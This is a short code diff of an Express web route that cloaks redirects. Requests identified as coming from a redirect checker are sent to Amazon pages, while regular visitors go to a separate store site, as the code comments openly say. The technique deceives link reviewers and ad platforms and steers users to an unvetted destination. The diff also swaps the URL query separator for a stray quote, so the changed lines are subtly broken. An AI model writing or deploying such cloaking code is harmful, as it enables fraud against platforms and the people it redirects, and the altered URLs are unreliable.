@@ -11,11 +11,11 @@ app.get('/', (req, res) => {
 
     if (isRedirectChecker) {
         // Redirect checker sees this URL
-        const targetUrl = `https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF?ref_=ast_sto_dp&th=1&psc=1?${queryParams}`;
+        const targetUrl = `https://www.amazon.com/stores/AmericanSoftLinen/page/5069F389-7B65-4BD7-8F40-3FA6B2B6F24B'${queryParams}`;
         res.redirect(302, targetUrl);
     } else {
         // Regular visitors see this URL
-        const visitorUrl = `https://roastandrelish.store?${queryParams}`;
+        const visitorUrl = `https://roastandrelish.store'${queryParams}`;
         res.redirect(302, visitorUrl);
     }
 });
